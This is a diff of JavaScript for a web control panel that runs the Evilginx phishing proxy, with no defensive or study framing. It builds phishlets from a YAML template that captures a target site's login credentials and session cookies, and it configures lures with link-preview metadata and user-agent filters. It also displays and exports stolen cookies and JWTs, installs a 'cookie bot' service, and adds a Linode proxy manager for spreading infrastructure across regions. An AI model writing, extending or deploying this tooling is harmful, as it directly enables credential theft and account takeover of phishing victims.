+async function doUnconfigPhishlet(name){await withBusy(typeof event!=='undefined'?event:null,'Deleting…',async()=>{const r=await api('/api/phishlets/'+name+'/unconfigure',{method:'POST'});closeModal();if(r.ok){toast(name+' unconfigured');loadConfig();loadPhishlets();loadLures()}else{toast(r.error||'Error','err')}})}
 function loadCfgPh(){var el=document.getElementById('cfgPhBody');if(!el)return;var h='';allPhishlets.forEach(p=>{h+=`<tr><td><strong style="color:var(--cyan)">${esc(p.name)}</strong></td><td>${esc(p.hostname||'\u2014')}</td><td>${p.enabled?'<span class="badge on">ENABLED</span>':'<span class="badge off">DISABLED</span>'}</td><td><div class="btn-group"><button class="btn sm" onclick="editPhishletCfg('${p.name}')"><i class="fa-solid fa-pen-to-square"></i></button><button class="btn sm ${p.enabled?'danger':'fill'}" onclick="togglePhishlet('${p.name}',${!p.enabled});setTimeout(()=>{loadPhishlets()},800)">${p.enabled?'Disable':'Enable'}</button><button class="btn sm danger" onclick="unconfigPhishlet('${p.name}')"><i class="fa-solid fa-trash-can"></i></button></div></td></tr>`});if(!h)h='<tr><td colspan="4" style="text-align:center;color:var(--text3)">No phishlets</td></tr>';el.innerHTML=h}
 
 async function loadPhishlets(){allPhishlets=await api('/api/phishlets');let html='';allPhishlets.forEach(p=>{html+=`<tr><td><strong style="color:var(--cyan)">${esc(p.name)}</strong></td><td>${esc(p.author||'\u2014')}</td><td>${esc(p.hostname||'\u2014')}</td><td>${p.enabled?'<span class="badge on">ENABLED</span>':'<span class="badge off">DISABLED</span>'}</td><td>${p.visible?'<span class="badge on">YES</span>':'<span class="badge off">HIDDEN</span>'}</td><td><div class="btn-group"><button class="btn sm" onclick="editPhishlet('${p.name}')"><i class="fa-solid fa-pen-to-square"></i></button><button class="btn sm ${p.enabled?'danger':'fill'}" onclick="togglePhishlet('${p.name}',${!p.enabled})">${p.enabled?'Disable':'Enable'}</button><button class="btn sm danger" onclick="deletePhishlet('${p.name}')"><i class="fa-solid fa-trash-can"></i></button></div></td></tr>`});if(!html)html='<tr><td colspan="6"><div class="empty"><i class="fa-solid fa-fish-fins"></i><p>No phishlets</p></div></td></tr>';$('#phishletsBody').innerHTML=html;loadCfgPh()}
 function openNewPhishlet(){openModal('NEW PHISHLET',`<div class="template-hint"><strong style="color:var(--accent)">i Phishlet YAML template:</strong> <code>proxy_hosts</code> \u2014 target domain | <code>auth_tokens</code> \u2014 cookies to capture | <code>credentials</code> \u2014 login fields | <code>login.path</code> \u2014 login page</div><div class="field"><label>Phishlet Name</label><input id="newPhName" placeholder="mysite"></div><div class="field" style="margin-top:12px"><label>YAML Content</label><textarea id="newPhYaml">author: '@Custom'\nmin_ver: '2.3.0'\n\nproxy_hosts:\n  - {phish_sub: '', orig_sub: '', domain: 'TARGET.COM', session: true, is_landing: true}\n\nsub_filters:\n  - triggers_on: 'TARGET.COM'\n    orig_sub: ''\n    domain: 'TARGET.COM'\n    search: 'TARGET.COM'\n    replace: '{hostname}'\n    mimes: ['text/html', 'application/json']\n\nauth_tokens:\n  - domain: '.TARGET.COM'\n    keys:\n      - 'SESSION_COOKIE'\n\ncredentials:\n  username:\n    key: 'email'\n    search: '(.*)'\n    type: 'post'\n  password:\n    key: 'password'\n    search: '(.*)'\n    type: 'post'\n\nlogin:\n  domain: 'TARGET.COM'\n  path: '/login'</textarea></div>`,`<button class="btn fill" onclick="createPhishlet()">CREATE</button> <button class="btn" onclick="closeModal()">CANCEL</button>`)}
-async function createPhishlet(){const name=$('#newPhName').value.trim();const content=$('#newPhYaml').value;if(!name)return toast('Enter a name','err');const r=await api('/api/phishlets',{method:'POST',body:JSON.stringify({name,content})});if(r.ok){closeModal();toast('Phishlet created');loadPhishlets()}else toast(r.error||'Error','err')}
+async function createPhishlet(){const name=$('#newPhName').value.trim();const content=$('#newPhYaml').value;if(!name)return toast('Enter a name','err');await withBusy(typeof event!=='undefined'?event:null,'Creating…',async()=>{const r=await api('/api/phishlets',{method:'POST',body:JSON.stringify({name,content})});if(r.ok){closeModal();toast('Phishlet created');loadPhishlets()}else toast(r.error||'Error','err')})}
 async function editPhishlet(name){const r=await api(`/api/phishlets/${name}`);if(r.error)return toast(r.error,'err');const p=allPhishlets.find(x=>x.name===name)||{};openModal(`EDIT: ${name}`,`<div class="form-grid"><div class="field"><label>Hostname <span class="hint" title="phishlets hostname ${name} YOUR.DOMAIN">i</span></label><input id="edPhHost" value="${esc(p.hostname||'')}"></div><div class="field"><label>Unauth URL</label><input id="edPhUnauth" value="${esc(p.unauth_url||'')}"></div></div><div class="field" style="margin-top:12px"><label>YAML Source</label><textarea id="edPhYaml" style="min-height:350px">${esc(r.content)}</textarea></div>`,`<button class="btn fill" onclick="savePhishlet('${name}')">SAVE</button> <button class="btn" onclick="closeModal()">CANCEL</button>`)}
-async function savePhishlet(name){const data={hostname:$('#edPhHost').value,unauth_url:$('#edPhUnauth').value,content:$('#edPhYaml').value};const r=await api(`/api/phishlets/${name}`,{method:'PUT',body:JSON.stringify(data)});if(r.ok){closeModal();toast('Saved. Restart to apply.');loadPhishlets()}else toast(r.error||'Error','err')}
+async function savePhishlet(name){const data={hostname:$('#edPhHost').value,unauth_url:$('#edPhUnauth').value,content:$('#edPhYaml').value};await withBusy(typeof event!=='undefined'?event:null,'Saving…',async()=>{const r=await api(`/api/phishlets/${name}`,{method:'PUT',body:JSON.stringify(data)});if(r.ok){closeModal();toast('Saved. Restart to apply.');loadPhishlets()}else toast(r.error||'Error','err')})}
 async function togglePhishlet(name,enable){const r=await api(`/api/phishlets/${name}/toggle`,{method:'POST',body:JSON.stringify({enable})});if(r.ok){toast(`${name} ${enable?'enabled':'disabled'}`);loadPhishlets();loadCfgPh()}else toast(r.error||'Error','err')}
-async function deletePhishlet(name){if(!confirm(`Delete phishlet "${name}"?`))return;const r=await api(`/api/phishlets/${name}`,{method:'DELETE'});if(r.ok){toast('Deleted');loadPhishlets()}else toast(r.error||'Error','err')}
+async function deletePhishlet(name){if(!confirm(`Delete phishlet "${name}"?`))return;await withBusy(typeof event!=='undefined'?event:null,'Deleting…',async()=>{const r=await api(`/api/phishlets/${name}`,{method:'DELETE'});if(r.ok){toast('Deleted');loadPhishlets()}else toast(r.error||'Error','err')})}
 async function loadConfig(){if(!allPhishlets.length)allPhishlets=await api('/api/phishlets');loadCfgPh();checkEvCfg()}
-async function saveConfig(){const data={domain:$('#cfgDomain').value,ipv4:$('#cfgIpv4').value,https_port:parseInt($('#cfgHttps').value)||443,dns_port:parseInt($('#cfgDns').value)||53,unauth_url:$('#cfgUnauth').value,blacklist_mode:$('#cfgBlacklist').value,autocert:$('#cfgAutocert').value==='true'};const r=await api('/api/config',{method:'POST',body:JSON.stringify(data)});if(r.ok)toast(r.msg||'Config saved');else toast(r.error||'Error','err')}
+async function saveConfig(){const data={domain:$('#cfgDomain').value,ipv4:$('#cfgIpv4').value,https_port:parseInt($('#cfgHttps').value)||443,dns_port:parseInt($('#cfgDns').value)||53,unauth_url:$('#cfgUnauth').value,blacklist_mode:$('#cfgBlacklist').value,autocert:$('#cfgAutocert').value==='true'};await withBusy(typeof event!=='undefined'?event:null,'Saving…',async()=>{const r=await api('/api/config',{method:'POST',body:JSON.stringify(data)});if(r.ok)toast(r.msg||'Config saved');else toast(r.error||'Error','err')})}
 async function loadLures(){allLures=await api('/api/lures');let html='';allLures.forEach((l,i)=>{html+=`<tr><td>${i}</td><td><span style="color:var(--cyan)">${esc(l.phishlet)}</span></td><td>${esc(l.path||'/')}</td><td style="max-width:300px"><code style="color:var(--accent);font-size:12px;word-break:break-all">${esc(l.url||'\u2014')}</code></td><td>${l.paused?'<span class="badge off">PAUSED</span>':'<span class="badge on">ACTIVE</span>'}</td><td><div class="btn-group"><button class="btn sm" onclick="editLure(${i})"><i class="fa-solid fa-pen-to-square"></i></button><button class="btn sm" onclick="copyUrl('${esc(l.url||'')}')" ><i class="fa-solid fa-copy"></i> URL</button><button class="btn sm danger" onclick="deleteLure(${i})"><i class="fa-solid fa-trash-can"></i></button></div></td></tr>`});if(!html)html='<tr><td colspan="6"><div class="empty"><i class="fa-solid fa-link"></i><p>No lures</p></div></td></tr>';$('#luresBody').innerHTML=html}
 function openNewLure(){let phOpts=allPhishlets.map(p=>`<option value="${p.name}">${p.name}</option>`).join('');if(!phOpts)phOpts='<option value="">\u2014 load phishlets first \u2014</option>';openModal('NEW LURE',`<div class="template-hint"><strong style="color:var(--accent)">i</strong> Pick a phishlet and set the URL path.</div><div class="form-grid"><div class="field"><label>Phishlet</label><select id="nlPhishlet">${phOpts}</select></div><div class="field"><label>Path</label><input id="nlPath" value="/"></div><div class="field"><label>Redirect URL</label><input id="nlRedirect" placeholder="https://real-site.com"></div><div class="field"><label>UA Filter</label><input id="nlUa" placeholder=""></div></div>`,`<button class="btn fill" onclick="createLure()">CREATE</button> <button class="btn" onclick="closeModal()">CANCEL</button>`)}
-async function createLure(){const data={phishlet:$('#nlPhishlet').value,path:$('#nlPath').value||'/',redirect_url:$('#nlRedirect').value,ua_filter:$('#nlUa').value};const r=await api('/api/lures',{method:'POST',body:JSON.stringify(data)});if(r.ok){closeModal();toast('Lure created');loadLures()}else toast(r.error||'Error','err')}
+async function createLure(){const data={phishlet:$('#nlPhishlet').value,path:$('#nlPath').value||'/',redirect_url:$('#nlRedirect').value,ua_filter:$('#nlUa').value};await withBusy(typeof event!=='undefined'?event:null,'Creating…',async()=>{const r=await api('/api/lures',{method:'POST',body:JSON.stringify(data)});if(r.ok){closeModal();toast('Lure created');loadLures()}else toast(r.error||'Error','err')})}
 function editLure(idx){const l=allLures[idx];if(!l)return;let phOpts=allPhishlets.map(p=>`<option value="${p.name}" ${p.name===l.phishlet?'selected':''}>${p.name}</option>`).join('');openModal(`EDIT LURE #${idx}`,`<div class="form-grid"><div class="field"><label>Phishlet</label><select id="elPhishlet">${phOpts}</select></div><div class="field"><label>Path</label><input id="elPath" value="${esc(l.path||'/')}"></div><div class="field"><label>Redirect URL</label><input id="elRedirect" value="${esc(l.redirect_url||'')}"></div><div class="field"><label>UA Filter</label><input id="elUa" value="${esc(l.ua_filter||'')}"></div><div class="field"><label>OG Title</label><input id="elOgTitle" value="${esc(l.og_title||'')}"></div><div class="field"><label>OG Description</label><input id="elOgDesc" value="${esc(l.og_desc||'')}"></div><div class="field"><label>OG Image</label><input id="elOgImg" value="${esc(l.og_image||'')}"></div><div class="field"><label>OG URL</label><input id="elOgUrl" value="${esc(l.og_url||'')}"></div></div>`,`<button class="btn fill" onclick="saveLure(${idx})">SAVE</button> <button class="btn" onclick="closeModal()">CANCEL</button>`)}
-async function saveLure(idx){const data={index:idx,phishlet:$('#elPhishlet').value,path:$('#elPath').value,redirect_url:$('#elRedirect').value,ua_filter:$('#elUa').value,og_title:$('#elOgTitle').value,og_desc:$('#elOgDesc').value,og_image:$('#elOgImg').value,og_url:$('#elOgUrl').value};const r=await api('/api/lures',{method:'PUT',body:JSON.stringify(data)});if(r.ok){closeModal();toast('Lure updated');loadLures()}else toast(r.error||'Error','err')}
-async function deleteLure(idx){if(!confirm(`Delete lure #${idx}?`))return;const r=await api('/api/lures',{method:'DELETE',body:JSON.stringify({index:idx})});if(r.ok){toast('Deleted');loadLures()}else toast(r.error||'Error','err')}
+async function saveLure(idx){const data={index:idx,phishlet:$('#elPhishlet').value,path:$('#elPath').value,redirect_url:$('#elRedirect').value,ua_filter:$('#elUa').value,og_title:$('#elOgTitle').value,og_desc:$('#elOgDesc').value,og_image:$('#elOgImg').value,og_url:$('#elOgUrl').value};await withBusy(typeof event!=='undefined'?event:null,'Saving…',async()=>{const r=await api('/api/lures',{method:'PUT',body:JSON.stringify(data)});if(r.ok){closeModal();toast('Lure updated');loadLures()}else toast(r.error||'Error','err')})}
+async function deleteLure(idx){if(!confirm(`Delete lure #${idx}?`))return;await withBusy(typeof event!=='undefined'?event:null,'Deleting…',async()=>{const r=await api('/api/lures',{method:'DELETE',body:JSON.stringify({index:idx})});if(r.ok){toast('Deleted');loadLures()}else toast(r.error||'Error','err')})}
 function copyUrl(url){if(navigator.clipboard&&window.isSecureContext){navigator.clipboard.writeText(url).then(()=>toast('URL copied!')).catch(()=>toast('Copy failed','err'))}else{const ta=document.createElement('textarea');ta.value=url;ta.style.cssText='position:fixed;left:-9999px';document.body.appendChild(ta);ta.select();try{document.execCommand('copy');toast('URL copied!')}catch(e){toast('Copy failed','err')}document.body.removeChild(ta)}}
 var currentSessFilter='all';
 var _jwtCache={id:null,list:[]};
@@ -682,6 +990,23 @@ function setSessCountText(n,filter,searching){
   if(searching) el.innerHTML='Showing <strong style="color:var(--accent)">'+n+'</strong> '+word+' <span style="color:var(--text3)">('+lab+' · search)</span>';
   else el.innerHTML='Showing <strong style="color:var(--accent)">'+n+'</strong> '+word+' <span style="color:var(--text3)">('+lab+')</span>';
 }
+function resetSessSearch(){
+  var el=$('#sessSearch');
+  if(!el)return;
+  el.value='';
+  el.setAttribute('readonly','readonly');
+  _sessIgnoreAutofill=true;
+  var n=0;
+  var t=setInterval(function(){
+    n++;
+    if(el && document.activeElement!==el){
+      el.value='';
+      el.setAttribute('readonly','readonly');
+    }
+    if(n>=20){clearInterval(t);_sessIgnoreAutofill=false}
+  },100);
+}
+var _sessIgnoreAutofill=true;
 async function loadSessions(filter){
   if(!filter)filter=currentSessFilter||'all';
   currentSessFilter=filter;
@@ -702,13 +1027,20 @@ async function loadSessions(filter){
     if(!html)html='<tr><td colspan="9" style="text-align:center;color:var(--text3)">No sessions</td></tr>';
     $('#sessionsBody').innerHTML=html;
     var q=($('#sessSearch')&&$('#sessSearch').value)||'';
-    if(q) searchSessions(q);
-    else setSessCountText(ss.length,filter,false);
+    if(q && !_sessIgnoreAutofill && document.activeElement===$('#sessSearch')) searchSessions(q);
+    else{
+      if($('#sessSearch') && document.activeElement!==$('#sessSearch')) $('#sessSearch').value='';
+      setSessCountText(ss.length,filter,false);
+    }
   }finally{
     if(ldr)ldr.classList.remove('show');
   }
 }
 function searchSessions(q){
+  if(_sessIgnoreAutofill && document.activeElement!==$('#sessSearch')){
+    var el=$('#sessSearch'); if(el) el.value='';
+    return;
+  }
   q=(q||'').toLowerCase().trim();
   var vis=0,total=0;
   document.querySelectorAll('#sessionsBody tr').forEach(function(r){
@@ -839,9 +1171,9 @@ async function viewJwt(id,ev){
 }
 
 async function viewSession(id){const s=await api(`/api/sessions/${id}`);if(s.error)return toast(s.error,'err');let cookieHtml='';for(const[dom,cks]of Object.entries(s.tokens||{})){for(const[cn,ci]of Object.entries(cks)){const val=ci.Value||ci.value||'';cookieHtml+=`<tr><td style="color:var(--cyan)">${esc(dom)}</td><td style="color:var(--accent)">${esc(cn)}</td><td>${esc(val.substring(0,120))}${val.length>120?'\u2026':''}</td></tr>`}}openModal(`SESSION #${id}`,`<div class="detail-grid"><div class="lbl">ID</div><div class="val">${s.id}</div><div class="lbl">Phishlet</div><div class="val">${esc(s.phishlet)}</div><div class="lbl">Remote IP</div><div class="val">${esc(s.remote_addr)}</div><div class="lbl">Landing URL</div><div class="val">${esc(s.landing_url)}</div><div class="lbl">User Agent</div><div class="val" style="font-size:12px">${esc(s.useragent)}</div><div class="lbl">Created</div><div class="val">${ts(s.create_time)}</div><div class="lbl">Updated</div><div class="val">${ts(s.update_time)}</div><div class="lbl">Has JWT</div><div class="val">${s.has_jwt?'<span class="badge jwt jwt-open" title="Open JWT" onclick="viewJwt('+s.id+',event)">YES</span>':'<span class="badge off">NO</span>'}</div></div><div class="sec-title" style="font-size:13px"><i class="fa-solid fa-cookie-bite"></i> Captured Cookies (${s.n_cookies})</div><div class="tbl-wrap"><table class="cookie-tbl"><thead><tr><th>Domain</th><th>Name</th><th>Value</th></tr></thead><tbody>${cookieHtml||'<tr><td colspan="3" style="text-align:center;color:var(--text3)">No cookies</td></tr>'}</tbody></table></div>`,`<button class="btn fill" onclick="downloadCookieJson(${id})"><i class="fa-solid fa-cloud-arrow-down"></i> Download JSON</button>`+(s.has_jwt?`<button class="btn" onclick="viewJwt(${id})"><i class="fa-solid fa-key"></i> JWT</button>`:'')+`<button class="btn" onclick="closeModal()">CLOSE</button>`)}
-async function startEvilginx(){toast('Starting...');const r=await api('/api/ev/start',{method:'POST'});if(r.ok){toast('Started');updateEvStatus(r.running)}else toast('Failed','err')}
-async function stopEvilginx(){if(!confirm('Stop evilginx?'))return;toast('Stopping...');const r=await api('/api/ev/stop',{method:'POST'});if(r.ok){toast('Stopped');updateEvStatus(false)}}
-async function restartEvilginx(){toast('Restarting...');const r=await api('/api/ev/restart',{method:'POST'});if(r.ok){toast('Restarted');updateEvStatus(r.running)}else toast('Failed','err')}
+async function startEvilginx(){await withBusy(typeof event!=='undefined'?event:null,'Starting…',async()=>{toast('Starting...');const r=await api('/api/ev/start',{method:'POST'});if(r.ok){toast('Started');updateEvStatus(r.running)}else toast('Failed','err')})}
+async function stopEvilginx(){if(!confirm('Stop evilginx?'))return;await withBusy(typeof event!=='undefined'?event:null,'Stopping…',async()=>{toast('Stopping...');const r=await api('/api/ev/stop',{method:'POST'});if(r.ok){toast('Stopped');updateEvStatus(false)}})}
+async function restartEvilginx(){await withBusy(typeof event!=='undefined'?event:null,'Restarting…',async()=>{toast('Restarting...');const r=await api('/api/ev/restart',{method:'POST'});if(r.ok){toast('Restarted');updateEvStatus(r.running)}else toast('Failed','err')})}
 function initTerminal(){if(termReady){fitAddon.fit();return}term=new Terminal({cursorBlink:true,cursorStyle:'bar',fontSize:15,fontFamily:"'JetBrains Mono',monospace",theme:{background:'#0a0e17',foreground:'#00ff88',cursor:'#00ff88',cursorAccent:'#0a0e17',selectionBackground:'rgba(0,255,136,0.15)',black:'#0a0e17',red:'#ef4444',green:'#00ff88',yellow:'#f59e0b',blue:'#22d3ee',magenta:'#a78bfa',cyan:'#22d3ee',white:'#94a3b8',brightBlack:'#475569',brightRed:'#f87171',brightGreen:'#4ade80',brightYellow:'#fbbf24',brightBlue:'#67e8f9',brightMagenta:'#c4b5fd',brightCyan:'#67e8f9',brightWhite:'#f1f5f9'}});fitAddon=new FitAddon.FitAddon();term.loadAddon(fitAddon);term.open($('#terminal-container'));fitAddon.fit();termReady=true;term.onData(data=>{socket.emit('term_in',{d:data})});socket.on('term_out',msg=>{term.write(msg.d)});window.addEventListener('resize',()=>{if(termReady)fitAddon.fit()});new ResizeObserver(()=>{if(termReady){fitAddon.fit();socket.emit('term_resize',{rows:term.rows,cols:term.cols})}}).observe($('#terminal-container'))}
 let shellTerm=null,shellFit=null,shellReady=false;
 function initShell(){
@@ -949,19 +1281,684 @@ function svcLiveLogs(name){
   socket.emit('journal_start',{unit:name});
 }
 function svcDelete(name){openModal('DELETE SERVICE','<p style="color:#fff;margin-bottom:12px">Stop, disable and remove <strong style="color:var(--cyan)">'+esc(name)+'</strong>?</p><p style="color:var(--text3);font-size:13px">Only custom units in /etc/systemd/system/ can be deleted. The script file is kept.</p>','<button class="btn danger" onclick="doSvcDelete(\''+name+'\')">DELETE</button><button class="btn" onclick="closeModal()">CANCEL</button>')}
-async function doSvcDelete(name){const r=await api('/api/services/'+encodeURIComponent(name),{method:'DELETE'});closeModal();if(r.ok){toast('Deleted');loadServices()}else toast(r.error||'Error','err')}
+async function doSvcDelete(name){await withBusy(typeof event!=='undefined'?event:null,'Deleting…',async()=>{const r=await api('/api/services/'+encodeURIComponent(name),{method:'DELETE'});closeModal();if(r.ok){toast('Deleted');loadServices()}else toast(r.error||'Error','err')})}
 function openNewService(preFile){openModal('NEW SERVICE','<div class="template-hint"><strong style="color:var(--accent)">i</strong> Creates a systemd unit: optional copy to <code>/usr/local/bin</code>, write service file, daemon-reload, enable, start.</div><div class="form-grid"><div class="field"><label>Service Name</label><input id="svName" placeholder="evilginx-cookie-bot"></div><div class="field"><label>Description</label><input id="svDesc" placeholder="Evilginx Cookie Bot Service"></div><div class="field" style="grid-column:1/-1"><label>Script File</label><input id="svFile" placeholder="/root/evilginx_cookie_bot.py" value="'+esc(preFile||'')+'"></div><div class="field"><label>Interpreter</label><select id="svInterp"><option value="auto">auto (.py / .sh / binary)</option><option value="python3">python3</option><option value="bash">bash</option><option value="exec">run file as-is</option></select></div><div class="field"><label>User</label><input id="svUser" value="root"></div><div class="field"><label>Working Directory</label><input id="svWork" placeholder="/root"></div><div class="field"></div></div><div style="display:flex;flex-direction:column;gap:12px;margin-top:8px"><label class="toggle-row"><input type="checkbox" id="svCopy" class="toggle-input" checked><span class="toggle-switch"></span><span class="toggle-label">Copy script to /usr/local/bin</span></label><label class="toggle-row"><input type="checkbox" id="svEnable" class="toggle-input" checked><span class="toggle-switch"></span><span class="toggle-label">Enable autostart</span></label><label class="toggle-row"><input type="checkbox" id="svStart" class="toggle-input" checked><span class="toggle-switch"></span><span class="toggle-label">Start now</span></label></div>','<button class="btn fill" onclick="createService()"><i class="fa-solid fa-gears"></i> CREATE & START</button><button class="btn" onclick="closeModal()">CANCEL</button>')}
-async function createService(){var name=($('#svName').value||'').trim();var file=($('#svFile').value||'').trim();if(!name)return toast('Service name required','err');if(!file)return toast('Script path required','err');var data={name:name,file:file,description:($('#svDesc').value||'').trim(),interpreter:$('#svInterp').value,user:($('#svUser').value||'root').trim(),workdir:($('#svWork').value||'').trim(),copy_to_bin:$('#svCopy').checked,enable:$('#svEnable').checked,start:$('#svStart').checked};const r=await api('/api/services',{method:'POST',body:JSON.stringify(data)});if(r.error){toast(r.error,'err');return}closeModal();toast('Service '+name+' created');svcFilter='custom';document.querySelectorAll('[data-svc]').forEach(function(b){b.classList.toggle('active',b.getAttribute('data-svc')==='custom')});loadServices()}
+async function createService(){var name=($('#svName').value||'').trim();var file=($('#svFile').value||'').trim();if(!name)return toast('Service name required','err');if(!file)return toast('Script path required','err');var data={name:name,file:file,description:($('#svDesc').value||'').trim(),interpreter:$('#svInterp').value,user:($('#svUser').value||'root').trim(),workdir:($('#svWork').value||'').trim(),copy_to_bin:$('#svCopy').checked,enable:$('#svEnable').checked,start:$('#svStart').checked};await withBusy(typeof event!=='undefined'?event:null,'Creating…',async()=>{const r=await api('/api/services',{method:'POST',body:JSON.stringify(data)});if(r.error){toast(r.error,'err');return}closeModal();toast('Service '+name+' created');svcFilter='custom';document.querySelectorAll('[data-svc]').forEach(function(b){b.classList.toggle('active',b.getAttribute('data-svc')==='custom')});loadServices()})}
 
 function deleteSession(id){openModal('DELETE SESSION','<p style="color:#fff;margin-bottom:12px">Delete session <strong style="color:var(--cyan)">#'+id+'</strong> from the database?</p><p style="color:var(--text3);font-size:13px">The rest of the database stays intact.</p>','<button class="btn danger" onclick="doDeleteSession('+id+')"><i class="fa-solid fa-trash-can"></i> DELETE</button><button class="btn" onclick="closeModal()">CANCEL</button>')}
-async function doDeleteSession(id){const r=await api('/api/sessions/'+id,{method:'DELETE'});closeModal();if(r.error)toast(r.error,'err');else{toast('Session #'+id+' deleted');loadSessions();if(document.getElementById('page-dashboard')&&document.getElementById('page-dashboard').classList.contains('active'))loadDashboard()}}
+async function doDeleteSession(id){await withBusy(typeof event!=='undefined'?event:null,'Deleting…',async()=>{const r=await api('/api/sessions/'+id,{method:'DELETE'});closeModal();if(r.error)toast(r.error,'err');else{toast('Session #'+id+' deleted');loadSessions();if(document.getElementById('page-dashboard')&&document.getElementById('page-dashboard').classList.contains('active'))loadDashboard()}})}
 function openClearSessions(){openModal('CLEAR DATABASE','<p style="color:#fff;margin-bottom:14px">This will delete <strong style="color:var(--red)">ALL sessions</strong> from data.db.</p><p style="color:var(--text3);font-size:13px;margin-bottom:16px">The evilginx database structure is kept (id counter). Enter the panel admin password to confirm.</p><div class="field"><label>Admin password</label><input id="clrDbPass" type="password" placeholder="••••••••"></div>','<button class="btn danger" onclick="doClearSessions()"><i class="fa-solid fa-database"></i> DELETE ALL</button><button class="btn" onclick="closeModal()">CANCEL</button>')}
-async function doClearSessions(){var pw=($('#clrDbPass').value||'');if(!pw){toast('Password required','err');return}const r=await api('/api/sessions/clear',{method:'POST',body:JSON.stringify({password:pw})});if(r.error){toast(r.error,'err');return}closeModal();toast('Database cleared');loadSessions();loadDashboard()}
+async function doClearSessions(){var pw=($('#clrDbPass').value||'');if(!pw){toast('Password required','err');return}await withBusy(typeof event!=='undefined'?event:null,'Deleting…',async()=>{const r=await api('/api/sessions/clear',{method:'POST',body:JSON.stringify({password:pw})});if(r.error){toast(r.error,'err');return}closeModal();toast('Database cleared');loadSessions();loadDashboard()})}
 function openModal(title,body,foot='',opts){stopJournalFollow();opts=opts||{};var box=$('#modalOverlay').querySelector('.modal');if(box)box.classList.toggle('wide',!!opts.wide);$('#modalTitle').textContent=title;$('#modalBody').innerHTML=body;$('#modalFoot').innerHTML=foot;$('#modalOverlay').classList.add('show');attachFindReplace($('#modalBody'));bindCardTables()}
 function closeModal(){stopJournalFollow();var ov=$('#modalOverlay');ov.classList.remove('show');var box=ov.querySelector('.modal');if(box)box.classList.remove('wide')}
 $('#modalOverlay').addEventListener('click',e=>{if(e.target===$('#modalOverlay'))closeModal()});
 document.addEventListener('keydown',e=>{if(e.key==='Escape')closeModal();if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='h'){var ov=$('#modalOverlay');if(ov&&ov.classList.contains('show')){e.preventDefault();var fi=ov.querySelector('.fr-find');if(fi)fi.focus();}}});
+/* ═══ Proxy Manager ═══ */
+let _pxRegions=[],_pxSel=new Set(),_pxPollId=null,_pxRefreshId=null,_pxPowerPollId=null,_pxSeen=new Set(),_pxAssignSt=null,_pxChartMode='',_pxChartCharge=false,_pxPowerJobs={},_pxLastSt=null,_pxRegionQ='';
+function pxFlag(cc){
+  cc=(cc||'').toLowerCase();
+  if(cc.length!==2)return '';
+  return '<img class="px-flag-img" src="https://flagcdn.com/w40/'+cc+'.png" alt="'+cc+'" onerror="this.style.display=\'none\'">';
+}
+function pxRegionMeta(id){
+  return _pxRegions.find(r=>r.id===id)||{id:id,label:id,country:'',city:id};
+}
+function _pxShowSkel(n){
+  const g=$('#pxGrid'); if(!g)return;
+  let h='';
+  for(let i=0;i<(n||3);i++) h+='<div class="px-tile px-skel px-in"><div class="sh lg"></div><div class="sh"></div><div class="sh"></div><div class="sh sm"></div><div class="sh"></div></div>';
+  g.innerHTML=h;
+}
+async function loadProxy(){
+  clearInterval(_pxPollId);clearInterval(_pxRefreshId);
+  try{
+    const k=await api('/api/proxy/key?_='+Date.now());
+    if(!k.configured){$('#pxKeyPanel').style.display='';$('#pxMainPanel').style.display='none';return}
+    $('#pxKeyPanel').style.display='none';$('#pxMainPanel').style.display='';
+    $('#pxAllowIp').textContent=k.allow_ip||'—';
+    _pxSeen=new Set();
+    _pxChartCharge=true;
+    _pxShowSkel(3);
+    _renderRegionChips();
+    await Promise.all([
+      _pxRefreshState(),
+      (async()=>{
+        try{
+          const rr=await api('/api/proxy/regions?_='+Date.now());
+          if(rr && !rr.error) _pxRegions=Array.isArray(rr)?rr:[];
+        }catch(e){}
+      })()
+    ]);
+    _pxRefreshId=setInterval(_pxRefreshState,30000);
+  }catch(e){toast('Proxy load error','err')}
+}
+async function pxConnect(){
+  const key=($('#pxApiKey').value||'').trim();
+  if(!key)return toast('Enter API key','err');
+  await withBusy(typeof event!=='undefined'?event:null,'Connecting…',async()=>{
+    const r=await api('/api/proxy/key',{method:'POST',body:JSON.stringify({api_key:key})});
+    if(r.ok){toast('Linode connected');loadProxy()}
+    else{openModal('CONNECTION FAILED','<p style="color:var(--red);font-size:14px;margin-bottom:10px"><i class="fa-solid fa-circle-xmark" style="margin-right:6px"></i>'+esc(r.error||'Invalid API key')+'</p><p style="color:var(--text3);font-size:13px">Check that your Linode Personal Access Token is valid and has Read/Write permissions for Linodes.</p>','<button class="btn" onclick="closeModal()">OK</button>')}
+  });
+}
+function pxDisconnect(){openModal('DISCONNECT LINODE','<p style="color:#fff">Remove the stored Linode API key? Existing proxies will keep running on Linode but won\'t be managed from this panel.</p>','<button class="btn danger" onclick="doPxDisconnect()">Disconnect</button><button class="btn" onclick="closeModal()">Cancel</button>')}
+async function doPxDisconnect(){await withBusy(typeof event!=='undefined'?event:null,'Disconnecting…',async()=>{const r=await api('/api/proxy/key',{method:'POST',body:JSON.stringify({api_key:''})});closeModal();toast('Disconnected');loadProxy()})}
+function pxRegionLine(r){
+  const cc=(r.country||'').toUpperCase();
+  const city=r.city||r.label||r.id;
+  return esc(cc)+', '+esc(city)+' <span class="slug">('+esc(r.id)+')</span>';
+}
+function _renderRegionChips(){
+  const c=parseInt($('#pxCount').value)||1;
+  const hint=$('#pxRegionHint');
+  if(hint)hint.textContent='(pick up to '+c+')';
+  let chips='';
+  [..._pxSel].forEach(id=>{
+    const r=pxRegionMeta(id);
+    chips+='<span class="px-chip">'+pxFlag(r.country)+'<span>'+esc((r.country||'').toUpperCase())+', '+esc(r.city||r.label||id)+'</span><span class="sub">('+esc(id)+')</span><button class="x" title="Remove" onclick="pxRemoveRegion(\''+esc(id)+'\')">&times;</button></span>';
+  });
+  const box=$('#pxRegionChips');
+  if(box)box.innerHTML=chips;
+}
+function _pxRegionMatch(r,q){
+  if(!q) return true;
+  const blob=[r.id,r.country,r.city,r.label,r.continent,r.display].join(' ').toLowerCase();
+  return q.toLowerCase().split(/\s+/).filter(Boolean).every(part=>blob.includes(part));
+}
+function _paintRegionMenu(){
+  const menu=$('#pxRegionMenu');
+  if(!menu)return;
+  const q=(_pxRegionQ||'').trim();
+  const groups={};
+  const order=['NORTH AMERICA','EUROPE','ASIA PACIFIC','SOUTH AMERICA','AFRICA','MIDDLE EAST','OTHER'];
+  _pxRegions.forEach(r=>{
+    if(_pxSel.has(r.id))return;
+    if(!_pxRegionMatch(r,q))return;
+    const g=r.continent||'OTHER';
+    (groups[g]=groups[g]||[]).push(r);
+  });
